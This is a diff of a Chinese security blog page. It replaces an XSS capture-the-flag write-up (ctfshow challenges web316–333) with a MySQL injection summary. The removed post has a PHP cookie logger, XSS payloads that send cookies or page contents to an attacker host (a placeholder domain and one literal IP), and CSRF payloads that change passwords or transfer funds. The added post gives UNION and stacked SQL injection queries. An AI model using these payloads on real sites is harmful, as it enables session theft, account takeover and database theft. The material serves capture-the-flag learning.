@@ -17,27 +17,24 @@
                 <meta name="author" content="whistle.H">
                 <meta name="keywords" content="">
                 
-                    <meta name="description" content="之前一直在比赛遇到xss的题目，决定开始认真练习一下。 web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼 网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。">
+                    <meta name="description" content="从这一篇开始，开始将常见的Web漏洞利用方式做一下总结，并且保持持续地更新。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctfshow-xss-wp">
-<meta property="og:url" content="http://example.com/2022/02/23/blog0004-ctfshow-xss-wp/index.html">
+<meta property="og:title" content="Web漏洞总结（一）——MySQL注入">
+<meta property="og:url" content="http://example.com/2022/03/31/blog0002-Web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94MySQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="The world of whistleH">
-<meta property="og:description" content="之前一直在比赛遇到xss的题目，决定开始认真练习一下。 web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼 网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。">
+<meta property="og:description" content="从这一篇开始，开始将常见的Web漏洞利用方式做一下总结，并且保持持续地更新。">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-02-22T16:29:11.000Z">
-<meta property="article:modified_time" content="2023-10-05T05:35:13.354Z">
+<meta property="article:published_time" content="2022-03-30T17:10:59.000Z">
+<meta property="article:modified_time" content="2023-10-05T06:06:07.725Z">
 <meta property="article:author" content="whistle.H">
-<meta property="article:tag" content="ctf">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="wp">
-<meta property="article:tag" content="ctfshow">
-<meta property="article:tag" content="xss">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="SQL">
 <meta name="twitter:card" content="summary_large_image">
                         
                                 
                                         
                                                     <title>
-                                                        ctfshow-xss-wp - The world of whistleH
+                                                        Web漏洞总结（一）——MySQL注入 - The world of whistleH
                                                     </title>
 
                                                     <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
@@ -207,7 +204,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="ctfshow-xss-wp"></span>
+            <span id="subtitle" data-typed-text="Web漏洞总结（一）——MySQL注入"></span>
           
         </div>
 
@@ -218,8 +215,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-02-23 00:29" pubdate>
-          2022年2月23日 凌晨
+        <time datetime="2022-03-31 01:10" pubdate>
+          2022年3月31日 凌晨
         </time>
       </span>
     
@@ -230,7 +227,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.4k 字
+          1.5k 字
         
       </span>
     
@@ -241,7 +238,7 @@
         
         
         
-          38 分钟
+          13 分钟
         
       </span>
     
@@ -278,63 +275,35 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">ctfshow-xss-wp</h1>
+            <h1 id="seo-header">Web漏洞总结（一）——MySQL注入</h1>
             
             
               <div class="markdown-body">
                 
-                <p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
-<p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p>
-<p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p>
+                <p>从这一篇开始，开始将常见的Web漏洞利用方式做一下总结，并且保持持续地更新。</p>
 <span id="more"></span>
-<p>反射型常见trick：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#python for temporary site</span><br>python3 <span class="hljs-literal">-m</span> http.server &#123;port&#125;<br></code></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#PHP for store the http request</span><br><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$log</span> = fopen(<span class="hljs-string">&quot;cookie.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>	fwrite(<span class="hljs-variable">$log</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>]);<br>	fclose(<span class="hljs-variable">$log</span>);<br>	<span class="hljs-comment">//var_dump(scandir(&quot;.&quot;));</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span><br><span class="hljs-comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span><br><span class="hljs-comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试试(find / -name &quot;cookie.txt&quot;)</span><br></code></pre></td></tr></table></figure>
-<h2 id="反射型web316---web326">反射型（Web316 - Web326)</h2>
-<p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p>
-<p>不过会有各种过滤</p>
-<p>附上payload，一般都试试，如果过不去了可以试试其他办法</p>
-<p>xss平台：https://xss.pt/</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//首先是经典的img</span><br>&lt;script&gt;<br>    <span class="hljs-keyword">var</span> img = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;img&quot;</span>);<br>	img.src = <span class="hljs-string">&quot;http://your-domain:port/&quot;</span>+<span class="hljs-built_in">document</span>.cookie;<br>&lt;/script&gt;<br><br><span class="hljs-comment">//location.href系列</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.open(<span class="hljs-string">&#x27;http://your-domain:port/?cookie=&#x27;</span>+<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.location.href=<span class="hljs-string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br><span class="hljs-comment">//iframe标签</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><br><span class="hljs-comment">//input标签</span><br>&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;<br>    <br>//svg标签<br>&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;<br>    <br>//body标签<br>&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;<br><br>//img标签<br>&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;<br>&lt;img src=&#x27;x&#x27; onclick=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;<br></code></pre></td></tr></table></figure>
-<p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
-<p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
-<h2 id="存储型">存储型</h2>
-<h3 id="web327">web327</h3>
-<p>这题的难度并没有很大，主要是要理解向admin发送邮件，使得admin用户打开邮件，从而获取到admin用户的cookie值。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;body onload=<span class="hljs-string">&quot;window.open(&#x27;http://your-ip:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
-<h3 id="web328">Web328</h3>
-<p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p>
-<p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p>
-<p>顺利搞到管理员的cookie</p>
-<p>常见的body标签这次没成功，换了一个发现能打出来</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;iframe	onload=<span class="hljs-string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
-<h3 id="web-329获取html内容">Web 329（获取HTML内容）</h3>
-<p>这题的方法和Web328是一样的，但是问题在于Cookie是有时效的，当Cookie被发送之后，则自动设置为无效了。类比一下现实情况，应该就是Cookie被设置了<code>HTTP-Only</code>，无法通过XSS获取到Cookie。</p>
-<p>但是参照上一题，我们可以知道flag值是存储在一个form里面的，因此我们可以利用Js直接读取HTML页面内容，直接让XSS返回我们的flag值。</p>
-<p>事实上我们在打的时候也不知道是具体flag值对应的下标，测试发现是1（其实应该也可以爆破</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;iframe onload=<span class="hljs-string">&quot;window.open(&#x27;http://121.5.227.123:2333/?cookie=&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
-<h3 id="web330get-xss">web330（GET XSS）</h3>
-<p>这算是非常经典的题型了，但其实应该算是CSRF攻击，在各种比赛里都有这个的影子。</p>
-<p>简单来说，就是让管理员访问我们的恶意链接，由于没有csrf鉴权，因此可以直接利用连接修改密码。</p>
-<p>附上payload:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;iframe onload=<span class="hljs-string">&quot;window.open(&#x27;http://127.0.0.1/api/change.php?p=123456&#x27;)&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
-<p>当然，由于之前的页面仍然存在，所以我们可以直接读取整个页面的内容，这样找到其中的flag，不过这应该算是非预期解。</p>
-<h3 id="web331post-xss">web331（POST XSS）</h3>
-<p>这道题的处理原理跟上一题是一样的理解，还是利用CSRF来实现admin用户的密码修改。</p>
-<p>这次的修改密码参数利用POST方法传参，这里我们可以利用XMLHttpRequest</p>
-<p>原型代码如下：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>    <span class="hljs-keyword">var</span> httpRequest = <span class="hljs-keyword">new</span> XMLHttpRequest();<br>    httpRequest.open(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;http://121.5.227.123/xss/cookie.php&#x27;</span>, <span class="hljs-literal">true</span>);<br>    httpRequest.setRequestHeader(<span class="hljs-string">&quot;Content-type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>    httpRequest.send(<span class="hljs-string">&#x27;p=1234567&#x27;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
-<p>转换成payload如下：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;iframe onload=<span class="hljs-string">&quot;var httpRequest = new XMLHttpRequest();httpRequest.open(&#x27;POST&#x27;, &#x27;http://127.0.0.1/api/change.php&#x27;, true);httpRequest.setRequestHeader(&#x27;Content-type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);httpRequest.send(&#x27;p=123456&#x27;);&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
-<p>当然也可以利用fetch来做：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>    <span class="hljs-keyword">let</span> res = fetch(<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>, &#123;<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<br>        <span class="hljs-attr">body</span>: <span class="hljs-string">&#x27;p=12345678&#x27;</span>,<br>        <span class="hljs-attr">headers</span>: &#123;<br>            <span class="hljs-string">&#x27;Content-type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        &#125;,<br>    &#125;);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
-<h3 id="web332转账xss">web332（转账XSS）</h3>
-<p>这道题在之前的极客大挑战也有出现过，还是CSRF的鉴权漏洞</p>
-<p>POST型XSS获取内容</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;iframe onload=<span class="hljs-string">&quot;var httpRequest = new XMLHttpRequest();httpRequest.open(&#x27;POST&#x27;, &#x27;http://127.0.0.1/api/amount.php&#x27;, true);httpRequest.setRequestHeader(&#x27;Content-type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);httpRequest.send(&#x27;u=user1&amp;a=10000&#x27;);&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
-<h3 id="web333">web333</h3>
-<p>同web331</p>
-<p>XSS篇章暂时结束</p>
+<h2 id="一报错注入">一、报错注入</h2>
+<p>当你在前端输入执行<code>sql</code>注入语句，后端执行之后，把错误信息返回给了前端，从而使你获取到了数据库的信息。</p>
+<h2 id="二联合注入">二、联合注入</h2>
+<h3 id="基本说明">1、基本说明</h3>
+<p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
+<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆破库名<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆破表名<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#123;database_name&#125;&#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆破列名<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#123;database_name&#125;&#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆破列名<span class="hljs-number">-2</span><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#123;table_name&#125;&#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆破内容<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-number">0x5c</span>,&#123;column_name&#125;,<span class="hljs-number">0x5c</span>,&#123;colunm_name&#125;) <span class="hljs-keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;);<br># 注意， 爆破内容时我们要考虑引号的问题<br># 补一个爆破内容的例子：<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-number">0x5c</span>,id,<span class="hljs-number">0x5c</span>,name) <span class="hljs-keyword">from</span> whistle.user);<br></code></pre></td></tr></table></figure>
+<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
+<h3 id="补充">2、补充</h3>
+<p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
+<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> ......<br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span><br></code></pre></td></tr></table></figure>
+<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
+<h2 id="二堆叠注入">二、堆叠注入</h2>
+<h3 id="说明">1、说明</h3>
+<p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
+<p>大致的原理和RCE中的管道运算符注入一样。</p>
+<h3 id="补充-1">2、补充</h3>
+<p>先上"随便注"的payload</p>
+<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
+<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-variable">@sql</span><span class="hljs-operator">=</span>concat(<span class="hljs-string">&#x27;sel&#x27;</span>,<span class="hljs-string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="hljs-keyword">Prepare</span> uut <span class="hljs-keyword">from</span> <span class="hljs-variable">@sql</span>; <span class="hljs-keyword">execute</span> uut;  <span class="hljs-comment">-- - </span><br></code></pre></td></tr></table></figure>
 
                 
               </div>
@@ -353,20 +322,13 @@
     
       <span class="category-chain">
         
-  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  <a href="/categories/Web%E6%BC%8F%E6%B4%9E/" class="category-chain-item">Web漏洞</a>
   
   
     <span>></span>
     
-  <a href="/categories/ctf/web/" class="category-chain-item">web</a>
+  <a href="/categories/Web%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" class="category-chain-item">SQL注入</a>
   
-  
-    <span>></span>
-    
-  <a href="/categories/ctf/web/wp/" class="category-chain-item">wp</a>
-  
-  
-
   
 
   
@@ -382,15 +344,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+        <a href="/tags/Web/" class="print-no-link">#Web</a>
       
-        <a href="/tags/web/" class="print-no-link">#web</a>
-      
-        <a href="/tags/wp/" class="print-no-link">#wp</a>
-      
-        <a href="/tags/ctfshow/" class="print-no-link">#ctfshow</a>
-      
-        <a href="/tags/xss/" class="print-no-link">#xss</a>
+        <a href="/tags/SQL/" class="print-no-link">#SQL</a>
       
     </div>
   
@@ -402,8 +358,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>ctfshow-xss-wp</div>
-      <div>http://example.com/2022/02/23/blog0004-ctfshow-xss-wp/</div>
+      <div>Web漏洞总结（一）——MySQL注入</div>
+      <div>http://example.com/2022/03/31/blog0002-Web漏洞总结（一）——MySQL注入/</div>
     </div>
     <div class="license-meta">
       
@@ -415,7 +371,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年2月23日</div>
+          <div>2022年3月31日</div>
         </div>
       
       
@@ -447,9 +403,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/03/01/blog0001-rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" title="命令/代码执行绕过">
+                      <a href="/2022/04/10/blog0011-ctfshow-LFI-wp/" title="ctfshow-LFI-wp">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">命令/代码执行绕过</span>
+                        <span class="hidden-mobile">ctfshow-LFI-wp</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -457,8 +413,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/02/22/blog0003-buuoj-web-wp-1/" title="Buuoj WP(Web方向-1)">
-                        <span class="hidden-mobile">Buuoj WP(Web方向-1)</span>
+                      <a href="/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/" title="pwn-xctf-新手区wp">
+                        <span class="hidden-mobile">pwn-xctf-新手区wp</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
